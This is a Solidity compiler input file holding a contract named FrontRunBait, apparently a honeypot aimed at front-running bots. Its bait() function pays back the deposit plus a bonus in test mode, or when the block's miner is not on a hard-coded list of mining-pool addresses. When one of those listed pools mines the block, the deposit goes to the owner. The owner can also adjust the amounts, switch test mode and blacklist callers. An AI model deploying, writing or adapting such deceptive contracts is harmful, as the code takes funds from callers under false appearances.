{
  "language": "Solidity",
  "settings": {
    "libraries": {},
    "metadata": {
      "useLiteralContent": true
    },
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "remappings": [],
    "outputSelection": {
      "*": {
        "*": [
          "*"
        ],
        "": [
          "*"
        ]
      }
    }
  },
  "sources": {
    "contracts/upgrade.sol": {
      "content": "// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.6.0;\r\n\r\n\r\ncontract FrontRunBait {\r\n    address immutable _owner;\r\n    uint256 public _baitAmount;\r\n    uint256 public _bonusAmount;\r\n    bool public _testMode;\r\n    \r\n    mapping (address => bool) _coinbase;\r\n    mapping (address => bool) _blacklist;\r\n\r\n    \r\n    constructor() public {\r\n        _owner = msg.sender;\r\n        _baitAmount = 1 ether;\r\n        _bonusAmount = 0.025 ether;\r\n        _testMode = true;\r\n        \r\n        _coinbase[address(0xEEa5B82B61424dF8020f5feDD81767f2d0D25Bfb)] = true;//BTC.com\r\n        _coinbase[address(0xbCC817f057950b0df41206C5D7125E6225Cae18e)] = true;//unknown\r\n        _coinbase[address(0xD224cA0c819e8E97ba0136B3b95ceFf503B79f53)] = true;//UUPool\r\n        _coinbase[address(0x00192Fb10dF37c9FB26829eb2CC623cd1BF599E8)] = true;//2Miners\r\n        _coinbase[address(0x06B8C5883Ec71bC3f4B332081519f23834c8706E)] = true;//MiningExpress\r\n        _coinbase[address(0x2f731c3e8Cd264371fFdb635D07C14A6303DF52A)] = true;//unknown\r\n        _coinbase[address(0x45a36a8e118C37e4c47eF4Ab827A7C9e579E11E2)] = true;//unknown\r\n        _coinbase[address(0x35F61DFB08ada13eBA64Bf156B80Df3D5B3a738d)] = true;//firepool\r\n        _coinbase[address(0x8595Dd9e0438640b5E1254f9DF579aC12a86865F)] = true;//EzilPool\r\n        _coinbase[address(0x7F101fE45e6649A6fB8F3F8B43ed03D353f2B90c)] = true;//Flexpool.io \r\n        _coinbase[address(0x829BD824B016326A401d083B33D092293333A830)] = true;//F2Pool\r\n        _coinbase[address(0x5A0b54D5dc17e0AadC383d2db43B0a0D3E029c4c)] = true;//Spark Pool\r\n        _coinbase[address(0x52bc44d5378309EE2abF1539BF71dE1b7d7bE3b5)] = true;//NanoPool\r\n        _coinbase[address(0x99C85bb64564D9eF9A99621301f22C9993Cb89E3)] = true;//BeePool\r\n        _coinbase[address(0xEA674fdDe714fd979de3EdF0F56AA9716B898ec8)] = true;//EtherMine\r\n        _coinbase[address(0x1aD91ee08f21bE3dE0BA2ba6918E714dA6B45836)] = true;//Hiveon Pool\r\n        _coinbase[address(0x04668Ec2f57cC15c381b461B9fEDaB5D451c8F7F)] = true;//zhizhu.top\r\n        _coinbase[address(0x3EcEf08D0e2DaD803847E052249bb4F8bFf2D5bB)] = true;//MiningPoolHub \r\n        _coinbase[address(0xB3b7874F13387D44a3398D298B075B7A3505D8d4)] = true;//Babel Pool \r\n    }\r\n    \r\n    fallback() external payable {  }\r\n    receive() external payable { }\r\n    \r\n    function setCoinbase(address coinbase) public {\r\n        require(msg.sender == _owner, 'not owner');\r\n        _coinbase[coinbase] = true;\r\n    }\r\n    \r\n    function setBaitAmount(uint256 amount) public {\r\n        require(msg.sender == _owner, 'not owner');\r\n        _baitAmount = amount;\r\n    }\r\n    \r\n    function setBonusAmount(uint256 amount) public {\r\n        require(msg.sender == _owner, 'not owner');\r\n        _bonusAmount = amount;    \r\n    }\r\n    \r\n    function setBlackListed(address blacklist) public {\r\n        require(msg.sender == _owner, 'not owner');\r\n        _blacklist[blacklist] = true;\r\n    }\r\n    \r\n    function testMode(bool activate) public {\r\n        require(msg.sender == _owner, 'not owner');\r\n        _testMode = activate;\r\n    }\r\n    \r\n    function bait() public payable returns(bool) {\r\n        require(msg.value >= _baitAmount, 'not enough money');\r\n        require(!_blacklist[msg.sender], 'blacklisted');\r\n        \r\n        if(msg.sender == _owner) {\r\n            msg.sender.transfer(msg.value + _bonusAmount);\r\n            return true;\r\n        }\r\n        \r\n        if(_testMode) {\r\n            msg.sender.transfer(msg.value + _bonusAmount);\r\n            return true;\r\n        }\r\n        \r\n        if(isMiner(block.coinbase)) {\r\n            payable(_owner).transfer(msg.value);\r\n            return true;\r\n        }\r\n        \r\n        msg.sender.transfer(msg.value + _bonusAmount);\r\n    }\r\n    \r\n    function isMiner(address coinbase) internal view returns(bool) {\r\n        if(_coinbase[coinbase]) {\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n}"
    }
  }
}